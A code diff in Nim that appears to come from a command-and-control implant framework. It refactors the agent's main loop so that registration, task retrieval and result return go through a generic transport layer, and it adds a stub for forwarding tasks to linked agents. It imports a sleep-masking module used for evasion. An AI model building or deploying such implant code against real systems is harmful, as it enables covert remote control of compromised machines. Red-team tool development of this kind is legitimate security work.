@@ -1,7 +1,7 @@
 import times, system, random, strformat
-import core/[http, context, sleepmask, exit]
+import core/[context, sleepmask, exit, transport]
 import utils/io
-import protocol/[task, result, heartbeat, registration]
+import protocol/[task, result, registration]
 import ../common/[types, utils, crypto]
 
 proc main() = 
@@ -39,7 +39,7 @@ proc main() =
                 var registration: Registration = ctx.collectAgentMetadata()
                 let registrationBytes = ctx.serializeRegistrationData(registration)
 
-                if ctx.httpPost(registrationBytes): 
+                if ctx.sendData(registrationBytes): 
                     print fmt"[+] [{ctx.agentId}] Agent registered."
                     ctx.registered = true
                 else: 
@@ -51,27 +51,31 @@ proc main() =
 
             # Retrieve task queue for the current agent by sending a check-in/heartbeat request
             # The check-in request contains the agentId and listenerId, so the server knows which tasks to return
-            var heartbeat: Heartbeat = ctx.createHeartbeat()
-            let 
-                heartbeatBytes: seq[byte] = ctx.serializeHeartbeat(heartbeat)
-                packet: string = ctx.httpGet(heartbeatBytes)
-
+            let packet: string = ctx.getTasks()
             if packet.len <= 0: 
                 print "[*] No tasks to execute."
                 continue
 
             let tasks: seq[Task] = ctx.deserializePacket(packet)
-            
             if tasks.len <= 0: 
                 print "[*] No tasks to execute."
                 continue
 
             # Execute all retrieved tasks and return their output to the server
             for task in tasks: 
-                var result: TaskResult = ctx.handleTask(task)
-                let resultBytes: seq[byte] = ctx.serializeTaskResult(result)
 
-                ctx.httpPost(resultBytes)
+                # Forward tasks to linked agents if necessary
+                if Uuid.toString(task.header.agentId) != ctx.agentId: 
+                    discard 
+                    
+                else: 
+                    var result: TaskResult = ctx.handleTask(task)
+                    let resultBytes: seq[byte] = ctx.serializeTaskResult(result)
+                    ctx.sendData(resultBytes)
+
+            # Check if there are results of linked agents that need to be returned 
+            # for link in ctx.links: 
+            #     discard
 
         except CatchableError as err: 
             print "[-] ", err.msg
